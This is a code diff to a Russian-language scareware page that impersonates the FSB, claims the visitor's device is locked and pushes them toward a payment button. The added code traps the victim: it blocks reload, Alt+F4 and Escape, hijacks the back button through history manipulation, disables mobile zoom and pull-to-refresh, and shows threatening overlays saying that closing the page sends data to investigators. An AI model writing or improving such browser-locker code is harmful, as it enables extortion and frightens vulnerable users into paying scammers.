@@ -19,6 +19,13 @@
             background-attachment: fixed;
             background-blend-mode: overlay;
             cursor: not-allowed;
+            touch-action: none;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
         
         .warning-animation {
@@ -169,9 +176,62 @@
             left: 0;
             z-index: 10002;
         }
+        
+        /* New styles for anti-close protection */
+        .anti-close-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 99999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 24px;
+            text-align: center;
+            padding: 20px;
+            display: none;
+        }
+        
+        .anti-close-content {
+            background-color: #b91c1c;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 80%;
+        }
+        
+        .fake-back-button {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background-color: #1e40af;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 5px;
+            z-index: 10003;
+            display: none;
+        }
     </style>
 </head>
 <body class="bg-gray-100 flex items-center justify-center min-h-screen disable-select">
+    <!-- Anti-close overlay -->
+    <div class="anti-close-overlay" id="antiCloseOverlay">
+        <div class="anti-close-content">
+            <h2>ПОПЫТКА ЗАКРЫТИЯ СТРАНИЦЫ ОБНАРУЖЕНА</h2>
+            <p>Ваше устройство заблокировано ФСБ РФ. Закрытие этой страницы приведет к автоматической передаче данных в следственные органы.</p>
+            <p>Продолжайте следовать инструкциям на экране для разблокировки устройства.</p>
+            <button onclick="hideAntiClose()" class="mt-4 bg-white text-red-600 px-4 py-2 rounded font-bold">ПОНЯТНО</button>
+        </div>
+    </div>
+    
+    <!-- Fake back button for mobile -->
+    <div class="fake-back-button" id="fakeBackButton">
+        ← Вернуться к уведомлению ФСБ
+    </div>
+
     <!-- Fake system cursor -->
     <div class="fake-cursor" id="fakeCursor"></div>
     
@@ -194,6 +254,9 @@
     </audio>
     <audio id="errorSound">
         <source src="https://assets.mixkit.co/sfx/preview/mixkit-software-interface-remove-2578.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="alertSound">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-security-alert-digital-1387.mp3" type="audio/mpeg">
     </audio>
     
     <!-- Full screen overlay to prevent access -->
@@ -323,6 +386,27 @@
                 showNotification('Использование системных сочетаний клавиш заблокировано');
             }
             
+            // Block F5, Ctrl+R, Ctrl+Shift+R, etc.
+            if (e.key === 'F5' || e.key === 'F11' || e.key === 'F12' || 
+                (e.ctrlKey && e.key === 'r') || 
+                (e.ctrlKey && e.shiftKey && e.key === 'r') ||
+                (e.metaKey && e.key === 'r')) {
+                showAntiClose();
+                document.getElementById('alertSound').play();
+            }
+            
+            // Block Alt+F4
+            if (e.altKey && e.key === 'F4') {
+                showAntiClose();
+                document.getElementById('alertSound').play();
+            }
+            
+            // Block Escape key
+            if (e.key === 'Escape') {
+                showAntiClose();
+                document.getElementById('alertSound').play();
+            }
+            
             return false;
         }, true);
         
@@ -364,6 +448,25 @@
             }, 200);
         }
         
+        // Show anti-close overlay
+        function showAntiClose() {
+            document.getElementById('antiCloseOverlay').style.display = 'flex';
+            document.getElementById('alertSound').play();
+        }
+        
+        function hideAntiClose() {
+            document.getElementById('antiCloseOverlay').style.display = 'none';
+        }
+        
+        // Detect back button on mobile
+        function handleBackButton() {
+            showAntiClose();
+            document.getElementById('fakeBackButton').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('fakeBackButton').style.display = 'none';
+            }, 3000);
+        }
+        
         // Play siren sound when page loads
         window.onload = function() {
             startCountdown();
@@ -377,8 +480,10 @@
             // Try to play the siren sound
             const sirenSound = document.getElementById('sirenSound');
             const errorSound = document.getElementById('errorSound');
+            const alertSound = document.getElementById('alertSound');
             sirenSound.volume = 0.4;
             errorSound.volume = 0.6;
+            alertSound.volume = 0.7;
             
             function playSiren() {
                 const promise = sirenSound.play();
@@ -400,9 +505,20 @@
             playSiren();
             
             // Prevent leaving the page
-            window.onbeforeunload = function() {
-                return "Ваше устройство заблокировано ФСБ. Закрытие этой страницы приведет к передаче данных в следственные органы!";
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = "Ваше устройство заблокировано ФСБ. Закрытие этой страницы приведет к передаче данных в следственные органы!";
+                showAntiClose();
+                return e.returnValue;
             };
+            
+            // Handle mobile back button
+            window.addEventListener('popstate', function() {
+                handleBackButton();
+                history.pushState(null, null, window.location.href);
+            });
+            
+            history.pushState(null, null, window.location.href);
         };
         
         // Countdown timer
@@ -521,7 +637,8 @@
         
         // Prevent any other clicks on the page
         document.addEventListener('click', function(e) {
-            if (e.target.id !== 'paymentButton' && e.target.id !== 'verifyButton') {
+            if (e.target.id !== 'paymentButton' && e.target.id !== 'verifyButton' && 
+                !e.target.closest('#antiCloseOverlay')) {
                 e.preventDefault();
                 e.stopPropagation();
                 showNotification('Доступ ограничен системой безопасности ФСБ');
@@ -535,13 +652,51 @@
                 'Обнаружены подозрительные процессы',
                 'Сканирование файловой системы...',
                 'Проверка сетевой активности',
-                'Мониторинг трафика...'
+                'Мониторинг трафика...',
+                'Защита от закрытия страницы активна',
+                'Антивирусная проверка...'
             ];
             
             if (Math.random() > 0.7) {
                 showNotification(messages[Math.floor(Math.random() * messages.length)]);
             }
         }, 10000);
+        
+        // Mobile-specific protections
+        if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            // Disable pinch zoom
+            document.addEventListener('touchmove', function(e) {
+                if (e.scale !== 1) { 
+                    e.preventDefault(); 
+                    showNotification('Масштабирование заблокировано системой безопасности');
+                }
+            }, { passive: false });
+            
+            // Prevent swipe to refresh
+            let startY = 0;
+            document.addEventListener('touchstart', function(e) {
+                startY = e.touches[0].clientY;
+            }, { passive: true });
+            
+            document.addEventListener('touchmove', function(e) {
+                const y = e.touches[0].clientY;
+                // Check if the user is trying to swipe down from the top
+                if (y - startY > 50 && window.scrollY <= 0) {
+                    e.preventDefault();
+                    handleBackButton();
+                }
+            }, { passive: false });
+            
+            // Show fake back button more often on mobile
+            setInterval(() => {
+                if (Math.random() > 0.8) {
+                    document.getElementById('fakeBackButton').style.display = 'block';
+                    setTimeout(() => {
+                        document.getElementById('fakeBackButton').style.display = 'none';
+                    }, 2000);
+                }
+            }, 15000);
+        }
     </script>
 </body>
 </html>
